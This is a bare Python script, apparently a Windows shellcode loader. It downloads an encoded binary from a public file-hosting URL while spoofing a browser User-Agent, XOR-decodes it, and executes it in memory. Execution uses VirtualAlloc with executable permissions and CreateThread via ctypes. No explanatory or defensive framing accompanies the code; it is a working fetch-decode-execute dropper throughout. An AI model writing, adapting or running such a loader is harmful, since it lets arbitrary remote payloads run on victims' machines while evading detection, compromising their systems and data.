import os
import ctypes
import requests

shellcode_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sc.bin")

if not os.path.exists(shellcode_path):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    r = requests.get("https://files.catbox.moe/2cmj1q.bin", headers=headers)
    with open(shellcode_path, "wb") as f:
        f.write(r.content)

with open(shellcode_path, "rb") as f:
    shellcode = bytearray(f.read())

key = [0x4A, 0x2F, 0x8C]
decoded = bytes([b ^ key[i % 3] for i, b in enumerate(shellcode)])

kernel32 = ctypes.windll.kernel32
kernel32.VirtualAlloc.restype = ctypes.c_void_p
ptr = kernel32.VirtualAlloc(0, len(decoded), 0x3000, 0x40)
if not ptr:
    exit()
ctypes.memmove(ptr, decoded, len(decoded))
handle = kernel32.CreateThread(0, 0, ctypes.c_void_p(ptr), 0, 0, 0)
kernel32.WaitForSingleObject(handle, 0xFFFFFFFF)